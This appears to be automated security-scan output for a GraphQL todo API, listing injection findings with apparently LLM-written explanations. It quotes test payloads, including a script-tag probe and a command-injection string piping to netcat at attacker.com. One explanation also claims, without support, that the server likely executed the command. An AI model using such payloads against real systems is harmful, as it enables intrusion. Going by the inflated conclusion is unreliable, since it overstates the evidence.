results.description: SQL injection vulnerability detected - malicious SQL patterns found in response
results.evidence: Response status: 200, SQL patterns detected in response

results.description: XSS injection vulnerability detected - malicious script patterns found in response
results.evidence: Response status: 200, XSS patterns detected in response data

results.description: The response body shows a script tag payload ("<script>alert(123)</script>") reflected unmodified in the 'title' field of the updateTodo mutation output. This indicates the API is neither sanitizing nor escaping user-supplied input before storage or reflection. While the vulnerability manifests client-side, this evidence confirms the server returns raw malicious scripts, enabling stored XSS attacks when this content is rendered in a web context without additional sanitization. This meets XSS detection criteria (script tags present in returned content).

llm_analysis.explanation: The response body shows a script tag payload ("<script>alert(123)</script>") reflected unmodified in the 'title' field of the updateTodo mutation output. This indicates the API is neither sanitizing nor escaping user-supplied input before storage or reflection. While the vulnerability manifests client-side, this evidence confirms the server returns raw malicious scripts, enabling stored XSS attacks when this content is rendered in a web context without additional sanitization. This meets XSS detection criteria (script tags present in returned content).

results.description: SSRF injection vulnerability detected - internal network access patterns found
results.evidence: Response status: 200, SSRF keywords detected in response

results.description: The response shows a GraphQL mutation (updateTodo) where the 'title' field contains a suspicious payload with shell command sequences. The semicolon (;) acts as a command separator, followed by a pipe (|) to netcat (nc), which attempts to send data to an external attacker-controlled server. This pattern is characteristic of OS command injection testing payloads. While the response doesn't show command output, the acceptance and storage of this payload without sanitization indicates the server likely executed the command. The payload's structure (command chaining, external network call) combined with GraphQL's mutation context (data modification operation) provides strong evidence of vulnerability.
results.evidence: The 'title' field contains payload: "test; echo 'malicious' | nc attacker.com 4444;"

llm_analysis.evidence: The 'title' field contains payload: "test; echo 'malicious' | nc attacker.com 4444;"
llm_analysis.explanation: The response shows a GraphQL mutation (updateTodo) where the 'title' field contains a suspicious payload with shell command sequences. The semicolon (;) acts as a command separator, followed by a pipe (|) to netcat (nc), which attempts to send data to an external attacker-controlled server. This pattern is characteristic of OS command injection testing payloads. While the response doesn't show command output, the acceptance and storage of this payload without sanitization indicates the server likely executed the command. The payload's structure (command chaining, external network call) combined with GraphQL's mutation context (data modification operation) provides strong evidence of vulnerability.

results.description: Path injection vulnerability detected - file system access patterns found
results.evidence: Response status: 200, Path injection patterns detected in response

results.description: HTML injection vulnerability detected - HTML markup found in response
results.evidence: Response status: 200, HTML patterns detected in response data

results.description: The response contains unsanitized HTML tags (<h1> and <iframe>) in the 'title' field. This indicates user-supplied HTML is stored and returned without proper sanitization. When rendered in a browser, this would execute the HTML markup, demonstrating a clear HTML injection vulnerability that could lead to XSS attacks.

llm_analysis.explanation: The response contains unsanitized HTML tags (<h1> and <iframe>) in the 'title' field. This indicates user-supplied HTML is stored and returned without proper sanitization. When rendered in a browser, this would execute the HTML markup, demonstrating a clear HTML injection vulnerability that could lead to XSS attacks.
